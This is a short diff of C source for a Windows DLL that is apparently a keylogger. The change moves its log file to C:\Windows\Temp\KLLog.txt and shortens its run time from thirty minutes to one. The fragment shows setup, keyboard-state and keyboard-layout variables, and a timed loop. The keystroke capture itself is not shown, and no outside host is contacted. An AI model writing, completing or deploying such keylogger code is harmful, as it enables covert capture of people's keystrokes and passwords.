@@ -18,20 +18,21 @@ BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
 }
 
 int EntryPoint() {
-    char logFileName[] = "E:\\Codeing\\Python Language\\Projects\\Project_19\\log.txt";
+    // char logFileName[] = "E:\\Codeing\\Python Language\\Projects\\Project_19\\log.txt";
+    char logFileName[] = "C:\\Windows\\Temp\\KLLog.txt";
     unsigned char keyboardState[256] = {0};
     unsigned short buffer[2];
     HKL keyboardLayout = GetKeyboardLayout(0);
 
     //Time Funtions
-    // 4297 = 1 min
+    // 4297 = 1 min  128910 = 30 min
     int TIM = 0;
 
     while (1) {
         Sleep(10);
         TIM++;
 
-        if (TIM==128910)
+        if (TIM==4297)
         {
             return 0;
         }
